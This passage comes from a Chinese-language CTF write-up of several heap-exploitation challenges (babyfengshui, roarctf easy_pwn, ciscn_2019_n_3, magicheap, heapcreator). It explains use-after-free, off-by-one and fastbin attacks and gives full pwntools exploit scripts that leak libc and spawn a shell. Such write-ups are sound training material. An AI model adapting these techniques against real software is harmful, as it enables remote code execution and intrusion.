          puts("my l33t defenses cannot be fooled, cya!");
          exit(1);
        }
        printf("text: ");
        input_name(**(&ptr + a1), v3 + 1);
      }
      return __readgsdword(0x14u) ^ v4;
    }
然后就是删除和输出两个函数，很常规，没什么好说的。
这里我们可以先连续申请三块大小为0x80的chunk，此时heap的情况如下：
然后free掉第一块chunk，chunk0和chunk0_name就会触发UNlink进行合并，接着申请一块大小为0x100的chunk，然后分配器就会将将这块chunk分配给用户，然后在chunk2_name之后申请一块chunk作为新申请的chunk的name。这时候对这块chunk进行输入，范围可以覆盖掉之前申请的所有chunk，就造成了溢出。
此时我们可以覆盖掉chunk1_name的chunk1指针内容为free函数的got表地址，然后对其进行输出，接收输出的地址，就可以借助LibcSearcher泄露libc，就可以得到system函数的地址，然后将free函数的got表覆写为system函数的plt表地址，就可以将free函数覆盖为system函数，然后对内容为`/bin/sh`的chunk进行free，就执行了`system("/bin/sh")`来getshell了。
exp:
    # -*- coding: UTF-8 -*-    from pwn import *
    from LibcSearcher  import *
    # io = process("./babyfengshui_33c3_2016")
    io = remote('node3.buuoj.cn', 28616)
    elf=ELF('./babyfengshui_33c3_2016')
    context.log_level='debug'
    free_got = elf.got['free']
    def add(size, length, text):
        io.sendlineafter("Action: ", '0')
        io.sendlineafter("description: ", str(size))
        io.sendlineafter("name: ", 'So4ms')
        io.sendlineafter("length: ", str(length))
        io.sendlineafter("text: ", text)
    def delete(index):
        io.sendlineafter("Action: ", '1')
        io.sendlineafter("index: ", str(index))
    def display(index):
        io.sendlineafter("Action: ", '2')
        io.sendlineafter("index: ", str(index))
    def edit(index, length, text):
        io.sendlineafter("Action: ", '3')
        io.sendlineafter("index: ", str(index))
        io.sendlineafter("length: ", str(length))
        io.sendlineafter("text: ", text)
    add(0x80, 0x80, 'aaaa')
    add(0x80, 0x80, 'aaaa')
    add(0x80, 0x80, '/bin/sh\x00')
    delete(0)
    add(0x100, 0x19c, 'a' * 0x198 + p32(free_got))
    display(1)
    io.recvuntil("description: ")
    free_addr = u32(io.recv(4))
    print(hex(free_addr))
    libc = LibcSearcher('free', free_addr)
    libc_base = free_addr - libc.dump('free')
    sys_addr = libc_base + libc.dump('system')
    edit(1, 4, p32(sys_addr))
    delete(2)
    io.interactive()
## 0x04 roarctf_2019_easy_pwn
还是一道菜单题，先来看看申请块。这里我对一些命名进行了修改，方便我们进行分析。
这里使用了一个数组`chunk_num_array`来记录申请的chunk的下标是否已经使用，也就是记录了目前有哪些chunk。第二个数组`chunk_size_array`用来记录了对应下标的chunk申请的size大小。第三个chunk就是记录了申请的chunk的地址了。
      for ( i = 0; i  0 )
          {
            if ( v3 > 4096 )
              v3 = 4096;
            v4 = calloc(v3, 1uLL);
            if ( !v4 )
              exit(-1);
            *((_DWORD *)&chunk_num_array + 4 * i) = 1;
            *((_DWORD *)&chunk_size_array + 4 * i) = v3;
            chunk_array[2 * i] = v4;
            printf("the index of ticket is %d \n", (unsigned int)i);
          }
          return (unsigned int)i;
        }
      }
然后就是对chunk的内容进行修改，这里进行输入长度判断的函数`check_size()`
对我们输入内容的长度进行检查，当我们输入的长度大小刚好大于申请大小十个字节时，存在off-by-one漏洞，溢出一字节。
    __int64 __fastcall check_size(int a1, unsigned int a2)
    {
      __int64 result; // rax
      if ( a1 > (int)a2 )
        return a2;
      if ( a2 - a1 == 10 )
        LODWORD(result) = a1 + 1;
      else
        LODWORD(result) = a1;
      return (unsigned int)result;
    }
先申请四块chunk，这里我们对第0块chunk进行输入，进行单字节溢出，对第一块chunk的size位进行修改。这里我们第一块chunk大小申请为0x58的原因是我们想达成下图所示效果，溢出能覆盖到下一chunk的size位。如果多一字节这块chunk的大小就变为0x71大小了，无法完成覆盖。
在将第一块chunk进行free时，可以将第一块和第二块chunk一起放入fastbins中。因为对chunk进行申请时使用的是`calloc()`
函数，会先将内存中的内容清空再进行分配，所以我们不能直接申请后输出unsortedbin头的地址，我们可以先将chunk1申请出来，然后chunk2还在unsortedbin中，fd和bk指针还指向着unsortedbin头的地址，而且我们还可以对这块chunk进行输出编辑，于是我们可以将unsortedbin头的地址输出，然后借此泄露出libc的基址。
这里我们可以使用一个工具来计算main_arean和libc的偏移
[main_arena_offset](https://github.com/bash-c/main_arena_offset
"main_arena_offset")。
有了libc的基址，我们就可以往`__malloc_hook`中写入one_gadget的地址，由于这题one_gadget的条件不满足，所以我们可以利用
realloc 函数调整 rsp。
我们可以选择 `realloc + 2` 的地址写入`__malloc_hook`中，这里我们少执行了一条 `push r15`
，rsp的地址就被抬高了八个字节，可以通过这种方式来尝试满足one_gadget的执行条件。
先把 one_gadget 写到 realloc_hook 中，然后把 realloc_hook 写到 malloc_hook 中，当去执行 malloc
的时候会先去执行 malloc_hook（这里就是 realloc_hook），然后执行 realloc_hook 里的 one_gadget 从而拿到
shell。
exp:
    from pwn import *
    from LibcSearcher import *
    # io = process('./easypwn')
    io = remote('node3.buuoj.cn',28175)
    libc = ELF('./libc-2.23.so')
    malloc_hook = libc.symbols['__malloc_hook']
    realloc = libc.symbols['__libc_realloc']
    def add(size):
      io.sendlineafter('choice: ',str(1))
      io.sendlineafter('size: ',str(size))
    def edit(index,size,content):
      io.sendlineafter('choice: ',str(2))
      io.sendlineafter('index: ',str(index))
      io.sendlineafter('size: ',str(size))
      io.sendlineafter('content: ',content)
    def delete(index):
      io.sendlineafter('choice: ',str(3))
      io.sendlineafter('index: ',str(index))
    def display(index):
      io.sendlineafter('choice: ',str(4))
      io.sendlineafter('index: ',str(index))
    add(0x58) #0
    add(0x60) #1
    add(0x60) #2
    add(0x60) #3
    edit(0, 0x58 + 0xa, 'a'* 0x58 + '\xe1')
    delete(1)
    add(0x60) #1
    gdb.attach(io)
    display(2)
    io.recvuntil("content: ")
    address = u64(io.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    libc_base = address - 0x58 - 0x3c4b20
    print(hex(libc_base))
    realloc = libc_base + realloc
    one = 0x4526a + libc_base
    fake_chunk = address - 0x8b
    add(0x60) #4 / 2
    delete(2)
    edit(4, 0x8, p64(fake_chunk))
    # gdb.attach(io)
    add(0x60) # 2 / 4
    add(0x60) # fake / 5
    payload = '\x00'*11 + p64(one) + p64(realloc + 2)
    edit(5, len(payload), payload)
    # gdb.attach(io)
    add(255)
    io.interactive()
## 0x05 ciscn_2019_n_3
这题相对比较简单，也是一道菜单题（heap都是菜单题吗（小声bb
开头给了system函数还是挺好的。
这里使用了records数组来记录申请的chunk的下标，为数组中的每一个元素申请了0xc大小的空间，刚好三个单位的大小，依次存放了输出函数、free函数和申请的chunk地址。
      records[v2] = (int)malloc(0xCu);
      v3 = (int *)records[v2];
      *v3 = (int)rec_int_print;
      v3[1] = (int)rec_int_free;
来看看chunk的free函数，将chunk进行free，但是没有进行置空，也就是说存在UAF漏洞，再结合函数指针，我们可以将rec_int_print或者rec_int_free的地址修改为system函数的地址，然后进行输出或者free时就可以getshell了。
    int __cdecl rec_str_free(void *ptr)
    {
      free(*((void **)ptr + 2));
      free(ptr);
      return puts("Note freed!");
    }
这里我们可以先申请三个chunk，然后free掉后两个chunk，由于bin的FILO机制，我们再一次进行申请的时候，会先将二号chunk的0xc大小的头给申请出来，然后会将一号chunk的头申请出来给三号chunk作为存储内容的chunk，这时我们进行输入，也就是可以覆盖一号chunk的函数指针，我们将fd处修改为bash字符串，bk处修改为system函数地址，free一号chunk，即可getshell。
exp：
    from pwn import *
    io = process('./ciscn_2019_n_3')
    io = remote('node3.buuoj.cn', 28466)
    elf = ELF('./ciscn_2019_n_3')
    def add(id, type, content, length):
        io.recvuntil("> ")
        io.sendline('1')
        io.recvuntil("> ")
        io.sendline(str(id))
        io.recvuntil("> ")
        if(type == 1):
            io.sendline(str(type))
            io.recvuntil("> ")
            io.sendline(str(content))
        else:
            io.sendline(str(type))
            io.recvuntil("> ")
            io.sendline(str(length))
            io.recvuntil("> ")
            io.sendline(str(content))
    def show(id):
        io.sendlineafter('> ','3')
        io.sendlineafter('> ',str(id))
    def delete(id):
        io.sendlineafter('> ','2')
        io.sendlineafter('> ',str(id))
    add(0, 2, 'aaaa', 0x88)
    add(1, 2, 'aaaa', 0x38)
    add(2, 1, 0x41, 0)
    delete(1)
    delete(2)
    add(3, 2, 'bash' + p32(elf.plt['system']), 0xc)
    delete(1)
    io.interactive()
## 0x06 hitcontraining_magicheap
还是一道菜单堆题，而且当我们输入4869时，程序会判断位于bss段的参数magic是否大于0x1305，大于则调用函数 `l33t()`
，和上面那题[ZJCTF 2019]EasyHeap差不多，而且这次是给了shell，不是给了假的flag位置，直接fastbin attack就可以了。
          if ( v3 == 4869 )
          {
            if ( (unsigned __int64)magic <= 0x1305 )
            {
              puts("So sad !");
            }
            else
            {
              puts("Congrt !");
              l33t();
            }
          }
exp:
    from pwn import *
    context(arch = 'amd64', os = 'linux', log_level = 'debug')
    # io = process('./magicheap')
    io = remote('node3.buuoj.cn', 25599)
    def add(size, content):
        io.sendlineafter('Your choice :', '1')
        io.sendlineafter('Size of Heap : ', str(size))
        io.sendlineafter('Content of heap:', content)
    def edit(id, size, content):
        io.sendlineafter('Your choice :', '2')
        io.sendlineafter('Index :', str(id))
        io.sendlineafter('Size of Heap : ', str(size))
        io.sendlineafter('Content of heap : ', content)
    def delete(id):
        io.sendlineafter('Your choice :', '3')
        io.sendlineafter('Index :', str(id))
    fake_chunk = 0x6020a0 - 0x13
    add(0x60, 'aaaa') # 0
    add(0x60, 'aaaa') # 1
    add(0x10, 'aaaa') # 2
    delete(1)
    edit(0, 0x78, 'a' * 0x60 + p64(0) + p64(0x71) + p64(fake_chunk))
    add(0x60, 'aaaa') # 1
    add(0x60, 'a' * 0x14) # 3 / fake
    io.sendlineafter(':', '4869')
    io.interactive()
## 0x07 hitcontraining_heapcreator
还是一道菜单堆题。
看一下create函数，这里先malloc了大小为0x10的空间，也就是大小为0x20的chunk，然后存入数组heaparray。然后输入我们想要申请的大小，申请完成后将申请的大小和申请的chunk的content地址依次存入之前申请的0x20的chunk中。
    unsigned __int64 create_heap()
    {
      __int64 v0; // rbx
      int i; // [rsp+4h] [rbp-2Ch]
      size_t size; // [rsp+8h] [rbp-28h]
      char buf[8]; // [rsp+10h] [rbp-20h] BYREF
      unsigned __int64 v5; // [rsp+18h] [rbp-18h]
      v5 = __readfsqword(0x28u);
      for ( i = 0; i <= 9; ++i )
      {
        if ( !*(&heaparray + i) )
        {
          *(&heaparray + i) = malloc(0x10uLL);
          if ( !*(&heaparray + i) )
          {
            puts("Allocate Error");
            exit(1);
          }
          printf("Size of Heap : ");
          read(0, buf, 8uLL);
          size = atoi(buf);
          v0 = (__int64)*(&heaparray + i);
          *(_QWORD *)(v0 + 8) = malloc(size);
          if ( !*((_QWORD *)*(&heaparray + i) + 1) )
          {
            puts("Allocate Error");
            exit(2);
          }
          *(_QWORD *)*(&heaparray + i) = size;
          printf("Content of heap:");
          read_input(*((void **)*(&heaparray + i) + 1), size);
          puts("SuccessFul");
          return __readfsqword(0x28u) ^ v5;
        }
      }
      return __readfsqword(0x28u) ^ v5;
    }
再来看看edit函数，重点看看这段输入的代码，提交的输入长度为申请的大小加一，也就是说存在off-by-one漏洞，刚好溢出一字节。
      if ( *(&heaparray + v1) )
      {
        printf("Content of heap : ");
        read_input(*((void **)*(&heaparray + v1) + 1), *(_QWORD *)*(&heaparray + v1) + 1LL);
        puts("Done !");
      }
delete函数中，free掉chunk时，会将预先申请的0x20的chunk和申请的chunk一起free掉。
      if ( *(&heaparray + v1) )
      {
        free(*((void **)*(&heaparray + v1) + 1));
        free(*(&heaparray + v1));
        *(&heaparray + v1) = 0LL;
        puts("Done !");
      }
于是我们可以先申请一块大小为0xx8（x任选）的chunk，这样溢出一字节就能够覆盖下一块chunk的size位，然后伪造chunk的大小，在经过free后再次申请伪造大小的chunk，从而产生
chunk overlap。
我们可以先申请四块chunk，大小依次为0x18、0x10、0x10、0x10。布局如下